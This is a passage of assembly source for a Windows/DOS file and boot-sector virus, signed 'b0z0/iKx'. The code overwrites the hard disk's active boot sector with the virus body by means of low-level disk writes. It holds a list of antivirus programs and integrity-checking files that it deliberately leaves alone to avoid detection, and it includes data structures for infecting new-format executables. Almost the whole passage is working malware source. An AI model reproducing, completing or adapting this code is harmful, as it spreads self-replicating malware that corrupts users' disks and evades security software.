                   mov     ax,000ah        ; Create Alias Descriptor
                   mov     bx,cs           ; so our cs is writeable
                   int     31h

                   mov     ds,ax

                   mov     bx,ax
                   mov     ax,0008h        ; Set Segment Limit
                   sub     cx,cx           ; so we are _sure_ that we
                   mov     dx,0c00h        ; will have enough space for
                   int     31h             ; hd infection

                   push    ds
                   pop     es

                   sub     bp,bp

                   call    infect_hdboot   ; infect HD boot with int 21h

                   mov     ax,0001h        ; free LDT descriptor we used
                   mov     bx,ds
                   int     31h
   already_inf:
                   pop     ds
                   pop     es
                   popa

                   db      0EAh            ; return to original exe
   winip           dw      0
   wincs           dw      0ffffh

   virus_author    db      'b0z0/iKx'

   int24h:
                   mov     al,00h
                   iret

   dontinfect      db      'AN','OT','86','AV','VP','US','IL','ED'
                   db      'OP','ND','LP','GR','PL','RK','YR','RE',0

   ; Antiviruses:
   ; AN - tbscan
   ;    - scan
   ; OT - f-prot
   ; AV - nav
   ;    - ms*av
   ; VP - avp
   ; US - findvirus
   ; OP - virstop
   ;
   ; Files that will tell the user that they were changed and that they are
   ; probably infected by a virus:
   ; IL - msmail and msmail releated
   ; ED - mssched.dll
   ;      mssched.exe
   ;      and some other Scheduler+ files
   ; LP - winhelp.exe
   ; GR - wgpomgr.dll
   ;    - mailmgr.dll
   ; PL - mailspl.exe
   ; RK - framework.dll
   ; RE - store.dll
   ;
   ; And this won't be infected because they won't work. I really don't know
   ; why...
   ; ND - lzexpand.dll
   ; 86 - kern386
   ;

   infect_hdboot:                     ; infects HD boot with int21h

                   lea     bx,[offset filebuffer+bp]
                   sub     cx,cx
                   sub     dh,dh
                   call    do_read                 ; read the MBR
                   jc      hderror

                   call    table_check             ; find active partition
                   jc      hderror

                   dec     cl                              ; no carry -> read
                   call    do_read                         ; read boot sector

                   cmp     word ptr [bx+boot_check+5],'US' ; already infected?
                   je      hderror

                   push    dx
                   push    cx

                   call    copy_boot_data                  ; copy boot stuff

                   mov     byte ptr ds:[fromfloppy+bp],cl
                   stc                                     ; write
                   call    do_read

                   inc     cx                      ; save body of the virus
                   lea     bx,[offset second_part_start+bp]
                   stc                             ; write
                   call    do_read
                   inc     cx
                   add     bx,200h                         ; next part
                   stc                                     ; write
                   call    do_read
                   add     bx,200h                         ; next part
                   inc     cx
                   stc                                     ; write
                   call    do_read

                   pop     cx
                   pop     dx
                   mov     bx,bp                           ; put virus boot
                   stc                                     ; write
                   call    do_read
   hderror:
                   ret

   copy_boot_data:
                   lea     si,[bx+03h]             ; copy cool boot stuff
                   lea     di,[bp+03h]
                   mov     cx,03bh
                   rep     movsb
                   sub     dh,dh
                   inc     cx
                   ret

   table_check:                                    ; finds the first bootable
                   mov     cl,4                    ; partition and put in
                   add     bx,01beh                ; DX and CX the head,
                                                   ; sector and cylinder
                                                   ; (in the format as int
                                                   ; 13h wants)
   ptable_loop:
                   dec     cl
                   cmp     byte ptr ds:[bx],080h   ; is bootable?
                   je      boot_found
                   add     bx,010h                 ; next partition
                   cmp     cl,0
                   jne     ptable_loop
                   stc                             ; all partition examined
                   ret                             ; but no active. leave
                                                   ; with carry as error
   boot_found:
                   mov     dx,word ptr ds:[bx]
                   mov     cx,word ptr ds:[bx+2]   ; sector + cyl
                   lea     bx,[offset filebuffer+bp]  ; and point on buffer
                   ret

   set_attributes:
                   mov     ax,0143h                ; no flags
                   xchg    al,ah
                   int     21h
                   ret

   do_read:
                   ; if Carry is set then this will do a WRITE on the HD
                   ; if Carry isn't set then a READ will be executed

                   push    dx
                   push    cx
                   mov     di,offset rw_struct     ; point to the structure
                   pushf                           ; needed by 440dh
                   add     di,bp
                   popf
                   mov     word ptr ds:[di+9],bx   ; store in the structure
                   mov     word ptr ds:[di+11],ds  ; as needed
                   mov     byte ptr ds:[di+1],dh
                   mov     byte ptr ds:[di+3],ch
                   mov     byte ptr ds:[di+5],cl
                   mov     cl,041h                 ; select between write (41h)
                   jc      do_rwop                 ; and read (61h)
                   add     cl,20h
   do_rwop:
                   mov     ch,08h          ; 08h = disk drive
                   mov     ax,440dh        ; IOCTL generic block device req
                   push    bx
                   mov     bl,03h          ; on C:
                   mov     dx,di           ; point to structure
                   int     21h
                   pop     bx
                   pop     cx
                   pop     dx
                   ret

   rw_struct:                              ; read write structure
   fix_byte        db      00h
   head_word       dw      00h
   cyl_word        dw      00h
   sec_word        dw      00h
   nr_word         dw      0001h           ; one sector at once. I think
   where_off       dw      00h             ; that this is a bug, because
   where_seg       dw      00h             ; DOS doesn't want to write/read
                                           ; more than one sectore at once :(
                                           ; or at least on all the machined
                                           ; i tested it wasn't working :(((
                                           ; so we will write/read one sector
                                           ; at once

   relocitem:                              ; relocation item for NewEXEs
           dw      1
           db      3
           db      4
           dw      offset winip
   old_cs  dw      0
   old_ip  dw      0
   relocitem_end:

   ; end of the virus in the file

   virus_end:

   winexe_data:                             ; data needed for newexe
   newexe_off      dw      0                ; infection
   al_shift        db      0
   ne_size         dw      0
   last_ne         dw      0
   lseek           dw      0
   lseek_add       dw      0

   int21set        db      09h               ; Int 21h set flag

   old_int24_off   dw      ?                 ; original int24 offset
   old_int24_seg   dw      ?                 ; original int24 segment

   tmpcounter      db      00h               ; counter for 4eh/4fh infection

   filenameoff     dw      ?                 ; stuff for 4eh/4fh infection
   filedotoff      dw      ?
   filename        db      4ch     dup     (?)

   lenax           dw      ?                 ; lenght of the file
   lendx           dw      ?

   filebuffer      db      512     dup     (?)     ; buffer for r/w operations

   file_att        dw      ?                 ; file attributes

   ; end of the virus in memory
   virus_end_mem:

   end
